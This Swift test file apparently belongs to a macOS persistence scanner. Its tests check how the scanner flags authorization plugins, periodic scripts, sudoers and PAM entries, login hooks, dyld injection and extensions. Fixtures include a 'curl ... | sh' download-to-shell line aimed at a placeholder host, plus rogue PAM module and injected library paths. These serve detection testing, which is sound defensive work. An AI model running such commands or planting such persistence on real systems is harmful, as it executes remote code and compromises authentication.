import Foundation
import Testing

@testable import MacxCore

@Suite("More persistence places")
struct MorePersistenceTests {
    func roots(_ tmp: TempDir) -> PersistenceRoots {
        PersistenceRoots(system: tmp.url.appendingPathComponent("sys"), home: tmp.url.appendingPathComponent("home"))
    }

    func rules(_ items: [PersistenceItem]) -> [String: Severity] {
        var out: [String: Severity] = [:]
        for f in PersistenceRules.evaluate(items, home: URL(fileURLWithPath: "/Users/v")) {
            out[f.rule] = max(out[f.rule] ?? .info, f.severity)
        }
        return out
    }

    @Test func parsesPluginkitAndKeepsOnlyNonSystemExtensions() {
        let out = """
                 com.apple.calculator.CalculatorWidget(11.0)
                        Path = /System/Applications/Calculator.app/Contents/PlugIns/CalculatorWidget.appex
                        UUID = EAE237E7
                         SDK = com.apple.widgetkit-extension
            +    com.vendor.tool.FinderSync(2.1)
                        Path = /Applications/Tool.app/Contents/PlugIns/FinderSync.appex
                         SDK = com.apple.FinderSync
            -    com.other.Share(1.0)
                        Path = /Users/v/Downloads/Other.app/Contents/PlugIns/Share.appex
                         SDK = com.apple.share-services
            """
        let items = OtherPersistence.appExtensions(pluginkitOutput: out, signatures: FakeSignatures(byPath: [:]))
        #expect(items.map(\.label) == ["com.vendor.tool.FinderSync", "com.other.Share"])
        #expect(items[0].detail == "com.apple.FinderSync, enabled")
        #expect(items[1].detail == "com.apple.share-services, disabled")
    }

    @Test func authorizationPluginsAreHigh() throws {
        let tmp = try TempDir()
        try tmp.file("sys/Library/Security/SecurityAgentPlugins/Evil.bundle/Contents/Info.plist", "x")
        let items = OtherPersistence.scan(roots(tmp), signatures: FakeSignatures(byPath: [:]), runner: FakeRunner(outputs: [:]))
        #expect(items.contains { $0.kind == .authorizationPlugin })
        #expect(rules(items)["authorization-plugin"] == .high)
    }

    @Test func periodicAndLocalScriptsAreScannedForPatterns() throws {
        let tmp = try TempDir()
        try tmp.file("sys/etc/periodic/daily/999.evil", "#!/bin/sh\ncurl -s https://x.example/p | sh\n")
        try tmp.file("sys/etc/daily.local", "echo hi\n")
        let items = OtherPersistence.scan(roots(tmp), signatures: FakeSignatures(byPath: [:]), runner: FakeRunner(outputs: [:]))
        let r = rules(items)
        #expect(r["periodic-script"] == .medium)
        #expect(r["download-to-shell"] == .high)
    }

    @Test func sudoersPamAndAtJobs() throws {
        let tmp = try TempDir()
        try tmp.file("sys/etc/sudoers.d/zz-extra", "x")
        try tmp.file(
            "sys/etc/pam.d/sudo", "auth sufficient pam_tid.so\nauth required /Users/v/.x/pam_evil.so\naccount required pam_permit.so\n")
        try tmp.file("sys/private/var/at/jobs/a0001", "x")
        let items = OtherPersistence.scan(roots(tmp), signatures: FakeSignatures(byPath: [:]), runner: FakeRunner(outputs: [:]))
        let r = rules(items)
        #expect(r["sudoers-file"] == .medium)
        #expect(r["non-apple-pam-module"] == .high)
        #expect(r["at-job"] == .low)
        #expect(items.filter { $0.kind == .pamModule }.count == 1)  // only the non-standard module
    }

    @Test func loginHooksAreHigh() {
        let item = OtherPersistence.loginHooks(defaultsOutput: ["LoginHook": "/Users/v/.hook.sh"])
        #expect(item.map(\.kind) == [.loginHook])
        #expect(rules(item)["login-hook"] == .high)
    }

    @Test func dyldInjectionInALaunchPlistIsHigh() throws {
        let tmp = try TempDir()
        let f = try tmp.plist(
            "LaunchAgents/com.x.plist",
            [
                "Label": "com.x", "Program": "/Applications/X.app/Contents/MacOS/X",
                "EnvironmentVariables": ["DYLD_INSERT_LIBRARIES": "/Users/v/.x/inject.dylib"],
            ])
        let item = try #require(
            LaunchdParser.parse(
                f, kind: .userLaunchAgent,
                signatures: FakeSignatures(byPath: ["/Applications/X.app/Contents/MacOS/X": .developerID(team: "T")])))
        #expect(item.injectedLibraries == ["/Users/v/.x/inject.dylib"])
        #expect(rules([item])["dyld-injection"] == .high)
    }

    @Test func systemExtensionsAndBrowserExtensionsAreListedNotFlagged() throws {
        let sysext = """
            7 extension(s)
            --- com.apple.system_extension.network_extension
            enabled\tactive\tteamID\tbundleID (version)\tname\t[state]
            *\t*\tW5364U7YZB\tio.tailscale.ipn.macsys.network-extension (1.104.7/101.104.7)\tTailscale Network Extension\t[activated enabled]
            \t\tW5364U7YZB\tio.tailscale.ipn.macsys.network-extension (1.102.4/101.102.4)\tTailscale Network Extension\t[terminated waiting to uninstall on reboot]
            """
        let ext = OtherPersistence.systemExtensions(output: sysext)
        #expect(ext.count == 2)
        #expect(ext[0].teamID == "W5364U7YZB")
        #expect(ext[0].label == "Tailscale Network Extension")

        let tmp = try TempDir()
        try tmp.file(
            "home/Library/Application Support/Google/Chrome/Default/Extensions/abcdefghijklmnopabcdefghijklmnop/1.2_0/manifest.json",
            #"{"name":"Good Extension","version":"1.2","permissions":["tabs"]}"#)
        try tmp.file(
            "home/Library/Application Support/Google/Chrome/Profile 1/Extensions/ponmlkjihgfedcbaponmlkjihgfedcba/3.0_0/manifest.json",
            #"{"name":"__MSG_appName__","version":"3.0"}"#)
        let browser = OtherPersistence.browserExtensions(home: tmp.url.appendingPathComponent("home"))
        #expect(browser.compactMap(\.label).sorted() == ["Good Extension", "ponmlkjihgfedcbaponmlkjihgfedcba"])
        #expect(rules(ext + browser).isEmpty)
    }

    @Test func newKindsSurviveTheBaseline() throws {
        let tmp = try TempDir()
        let items = OtherPersistence.loginHooks(defaultsOutput: ["LogoutHook": "/x"])
        try PersistenceBaseline.save(items, to: tmp.url.appendingPathComponent("b.json"))
        #expect(try PersistenceBaseline.load(from: tmp.url.appendingPathComponent("b.json")) == items)
    }
}

@Suite("PAM include lines and unavailable sources")
struct PAMIncludeTests {
    @Test func includeAndSubstackNameAFileNotAModule() {
        #expect(OtherPersistence.pamModule(in: "auth       include        sudo_local") == nil)
        #expect(OtherPersistence.pamModule(in: "auth substack system-auth") == nil)
        #expect(OtherPersistence.pamModule(in: "auth sufficient pam_tid.so") == "pam_tid.so")
        #expect(OtherPersistence.pamModule(in: "auth [success=1 default=ignore] /tmp/evil.so") == "/tmp/evil.so")
    }

    @Test func btmTimeoutIsReportedNotSilent() {
        struct Stuck: CommandRunner {
            func run(_ executable: String, _ arguments: [String]) throws -> String { throw CommandError.timedOut(executable) }
        }
        let (records, note) = BTMParser.currentWithNote(runner: Stuck(), isRoot: true)
        #expect(records.isEmpty)
        #expect(note?.contains("didn't answer") == true)
    }

    /// Without root, sfltool puts up an admin-password dialog (system.privilege.admin) and waits for it,
    /// forever on a Mac with nobody at the screen. So macx never runs it without root.
    @Test func btmIsNotRunWithoutRoot() {
        final class Recorder: CommandRunner, @unchecked Sendable {
            var calls: [String] = []
            func run(_ executable: String, _ arguments: [String]) throws -> String {
                calls.append(executable)
                return ""
            }
        }
        let r = Recorder()
        let (records, note) = BTMParser.currentWithNote(runner: r, isRoot: false)
        #expect(r.calls.isEmpty)
        #expect(records.isEmpty)
        #expect(note?.contains("sudo") == true)

        let (_, rootNote) = BTMParser.currentWithNote(runner: r, isRoot: true)
        #expect(r.calls == ["/usr/bin/sfltool"])
        #expect(rootNote == nil)
    }
}
